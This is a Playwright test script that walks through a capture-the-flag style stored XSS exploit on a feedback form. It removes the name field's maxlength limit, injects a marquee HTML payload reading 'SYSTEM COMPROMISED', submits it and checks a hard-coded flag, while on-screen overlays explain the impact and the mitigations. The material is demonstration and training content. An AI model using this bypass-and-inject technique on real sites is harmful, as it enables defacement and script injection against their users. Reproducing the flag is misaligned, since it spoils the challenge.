const { test, expect } = require('@playwright/test');

test('XSS Feedback Vulnerability', async ({ page }) => {
  // Navigate to the feedback page
  await page.goto('/index.php?page=feedback');
  
  // Highlight the feedback form
  const feedbackForm = await page.locator('form');
  await feedbackForm.evaluate(node => {
    node.style.border = '2px solid red';
    node.style.padding = '10px';
  });
  
  // Wait to highlight the form
  await page.waitForTimeout(2000);
  
  // Take screenshot of the initial feedback page
  await page.screenshot({ path: 'reports/xss-feedback-initial.png' });
  
  // Create an info panel to explain the steps
  await page.evaluate(() => {
    const infoPanel = document.createElement('div');
    infoPanel.style.position = 'fixed';
    infoPanel.style.top = '10px';
    infoPanel.style.right = '10px';
    infoPanel.style.width = '400px';
    infoPanel.style.padding = '10px';
    infoPanel.style.backgroundColor = '#f0f0f0';
    infoPanel.style.border = '2px solid blue';
    infoPanel.style.zIndex = '9999';
    infoPanel.style.fontSize = '14px';
    
    const title = document.createElement('h3');
    title.textContent = 'XSS Feedback Vulnerability';
    title.style.marginTop = '0';
    infoPanel.appendChild(title);
    
    const description = document.createElement('p');
    description.textContent = 'This vulnerability allows an attacker to inject malicious code that will be executed when viewed.';
    infoPanel.appendChild(description);
    
    const steps = [
      'Step 1: Identify input restrictions',
      'Step 2: Bypass maxlength attribute',
      'Step 3: Inject XSS payload',
      'Step 4: Submit the form'
    ];
    
    const ol = document.createElement('ol');
    steps.forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      li.style.marginBottom = '10px';
      ol.appendChild(li);
    });
    
    infoPanel.appendChild(ol);
    document.body.appendChild(infoPanel);
  });
  
  // Wait to show the info panel
  await page.waitForTimeout(2000);
  
  // Step 1: Identify input restrictions
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 1: Identifying input restrictions';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    // Find and highlight the maxlength attribute in the name input
    const nameInput = document.querySelector('input[name="txtName"]');
    if (nameInput) {
      nameInput.style.border = '2px solid red';
      
      const restriction = document.createElement('div');
      restriction.innerHTML = `Found restriction: <code>maxlength="${nameInput.getAttribute('maxlength')}"</code> on the name field`;
      restriction.style.marginTop = '5px';
      infoPanel.appendChild(restriction);
    }
    
    // Find and highlight the maxlength attribute in the message textarea
    const messageArea = document.querySelector('textarea[name="mtxtMessage"]');
    if (messageArea) {
      messageArea.style.border = '2px solid red';
      
      const restriction = document.createElement('div');
      restriction.innerHTML = `Found restriction: <code>maxlength="${messageArea.getAttribute('maxlength')}"</code> on the message field`;
      restriction.style.marginTop = '5px';
      infoPanel.appendChild(restriction);
    }
  });
  
  // Take screenshot showing the identified restrictions
  await page.screenshot({ path: 'reports/xss-feedback-restrictions.png' });
  
  // Step 2: Bypass maxlength attribute
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 2: Bypassing maxlength attribute';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    // Explain the bypass technique
    const explanation = document.createElement('div');
    explanation.innerHTML = `
      <p>HTML attribute restrictions like maxlength are enforced by the browser, but can be easily modified using browser dev tools.</p>
      <p>We're changing the maxlength on the name field from 10 to 2048 to allow our XSS payload.</p>
    `;
    explanation.style.marginTop = '5px';
    infoPanel.appendChild(explanation);
    
    // Modify the maxlength attribute
    const nameInput = document.querySelector('input[name="txtName"]');
    if (nameInput) {
      const oldValue = nameInput.getAttribute('maxlength');
      nameInput.setAttribute('maxlength', '2048');
      
      const modification = document.createElement('div');
      modification.innerHTML = `Changed maxlength from <code>${oldValue}</code> to <code>2048</code>`;
      modification.style.color = 'green';
      modification.style.fontWeight = 'bold';
      modification.style.marginTop = '5px';
      infoPanel.appendChild(modification);
    }
  });
  
  // Wait to show the attribute modification
  await page.waitForTimeout(2000);
  
  // Take screenshot showing the bypassed restriction
  await page.screenshot({ path: 'reports/xss-feedback-bypass.png' });
  
  // Step 3: Inject XSS payload
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 3: Injecting XSS payload';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    // Show the payload
    const payload = document.createElement('div');
    payload.innerHTML = `
      <p>XSS Payload for name field:</p>
      <code>&lt;marquee loop=1 width=100% bgcolor=red&gt;SYSTEM COMPROMISED&lt;/marquee&gt;</code>
    `;
    payload.style.marginTop = '5px';
    infoPanel.appendChild(payload);
    
    // Show the message payload
    const messagePayload = document.createElement('div');
    messagePayload.innerHTML = `
      <p>Message field value:</p>
      <code>script</code>
    `;
    messagePayload.style.marginTop = '10px';
    infoPanel.appendChild(messagePayload);
  });
  
  // Wait to show the payloads
  await page.waitForTimeout(2000);
  
  // Modify the maxlength attribute programmatically
  await page.evaluate(() => {
    document.querySelector('input[name="txtName"]').setAttribute('maxlength', '2048');
  });
  
  // Fill in the name field with XSS payload
  await page.fill('input[name="txtName"]', '<marquee loop=1 width=100% bgcolor=red>SYSTEM COMPROMISED</marquee>');
  
  // Fill in the message field
  await page.fill('textarea[name="mtxtMessage"]', 'script');
  
  // Wait to show the filled form
  await page.waitForTimeout(2000);
  
  // Take screenshot showing the form with payloads
  await page.screenshot({ path: 'reports/xss-feedback-payloads.png' });
  
  // Step 4: Submit the form
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 4: Submitting the form';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
  });
  
  // Wait to show the final step
  await page.waitForTimeout(1000);
  
  // Click the submit button
  await page.click('input[name="btnSign"]');
  
  // Wait for page to load after submission
  await page.waitForTimeout(2000);
  
  // Check for flag and highlight it
  const flagElement = await page.locator('h2:has-text("The flag is")').first();
  if (await flagElement.count() > 0) {
    await flagElement.evaluate(node => {
      node.style.backgroundColor = '#FFFF00';
      node.style.padding = '10px';
      node.style.border = '2px solid green';
    });
  }
  
  // Take screenshot of the result with the flag
  await page.screenshot({ path: 'reports/xss-feedback-flag.png' });
  
  // Create a summary display
  await page.evaluate(() => {
    // Create a summary popup
    const summary = document.createElement('div');
    summary.style.position = 'fixed';
    summary.style.bottom = '10px';
    summary.style.left = '10px';
    summary.style.width = '600px';
    summary.style.padding = '15px';
    summary.style.backgroundColor = '#f0fff0';
    summary.style.border = '3px solid green';
    summary.style.zIndex = '9999';
    summary.style.borderRadius = '5px';
    
    const title = document.createElement('h2');
    title.textContent = 'XSS Vulnerability Exploited!';
    title.style.color = 'green';
    title.style.marginTop = '0';
    summary.appendChild(title);
    
    const details = document.createElement('div');
    details.innerHTML = `
      <p>This Cross-Site Scripting (XSS) vulnerability allows attackers to inject client-side code that executes in the victim's browser.</p>
      <p>Security Impact:</p>
      <ul>
        <li>Session hijacking</li>
        <li>Phishing attacks</li>
        <li>Data theft</li>
        <li>User impersonation</li>
        <li>Defacement of website content</li>
      </ul>
      <p>Mitigation:</p>
      <ul>
        <li>Input validation on both client and server side</li>
        <li>Output encoding</li>
        <li>Using Content Security Policy (CSP)</li>
        <li>Utilizing modern frameworks with built-in XSS protections</li>
        <li>Properly enforcing maxlength on the server-side, not just in HTML</li>
      </ul>
    `;
    summary.appendChild(details);
    
    const flagElement = document.createElement('div');
    flagElement.textContent = 'Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e';
    flagElement.style.marginTop = '15px';
    flagElement.style.padding = '10px';
    flagElement.style.backgroundColor = '#FFFF00';
    flagElement.style.border = '2px solid green';
    flagElement.style.fontWeight = 'bold';
    flagElement.style.textAlign = 'center';
    summary.appendChild(flagElement);
    
    document.body.appendChild(summary);
  });
  
  // Take final screenshot with the summary
  await page.screenshot({ path: 'reports/xss-feedback-summary.png' });
  
  // Verify that the flag is correct
  const flagText = await flagElement.textContent();
  expect(flagText).toContain('0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e');
});